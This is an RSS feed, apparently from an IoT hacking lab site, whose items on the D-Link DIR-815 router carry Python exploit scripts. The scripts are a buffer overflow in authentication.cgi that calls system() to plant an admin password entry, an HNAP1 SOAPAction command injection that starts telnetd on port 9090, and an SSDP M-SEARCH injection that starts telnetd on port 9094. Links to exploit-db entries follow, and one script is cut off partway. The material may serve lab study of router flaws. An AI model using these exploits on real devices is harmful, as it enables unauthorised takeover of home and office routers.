<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DIR-815 on IoT Hack Labs</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/</link><description>Recent content in DIR-815 on IoT Hack Labs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 18 Oct 2021 20:39:54 -0600</lastBuildDate><atom:link href="https://iot-hack-labs.github.io/router-lab/dir-815/index.xml" rel="self" type="application/rss+xml"/><item><title>Auth Buffer Overflow</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</guid><description>Auth Buffer Overflow import urllib import urllib2 # This exploits the auth_main.cgi with read buffer overflow exploit for v2.02 # prequisite is just to have id and password fields in params url = &amp;#39;http://192.168.0.1/authentication.cgi&amp;#39; junk = &amp;#34;A&amp;#34;*1004+&amp;#34;B&amp;#34;*37+&amp;#34;\x58\xf8\x40\x00&amp;#34; # address of system function in executable junk+=&amp;#34;X&amp;#34;*164+&amp;#39;echo &amp;#34;Admin&amp;#34; &amp;#34;Admin&amp;#34; &amp;#34;0&amp;#34; &amp;gt; /var/passwd\x00&amp;#39;+&amp;#34;AAAA&amp;#34; values = &amp;#34;id=test&amp;amp;password=test&amp;amp;test=&amp;#34;+junk req = urllib2.Request(url, values) response = urllib2.urlopen(req) the_page = response.read()</description></item><item><title>OS Command Injection I</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</guid><description>OS Command Injection I import socket import struct # CSRF or any other trickery, but probably only works when connected to network I suppose buf = &amp;#34;POST /HNAP1/ HTTP/1.0\r\nHOST: 99.249.143.124\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX&amp;#34; + &amp;#39;;telnetd -p 9090;\r\n&amp;#39; + &amp;#34;1\r\n\r\n&amp;#34; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;192.168.0.1&amp;#34;, 80)) s.send(buf) or
import socket import struct # format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address) buf = &amp;#34;POST /HNAP1/ HTTP/1.</description></item><item><title>OS Command Injection II</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</guid><description>OS Command Injection II import socket import struct # This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN buf = &amp;#39;M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\r\nMX:2\r\nMAN:&amp;#34;ssdp:discover&amp;#34;\r\n\r\n&amp;#39; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((&amp;#34;239.255.255.250&amp;#34;, 1900)) s.send(buf) s.close()</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/references/</guid><description>References https://www.exploit-db.com/exploits/38721 https://www.exploit-db.com/exploits/38715</description></item></channel></rss>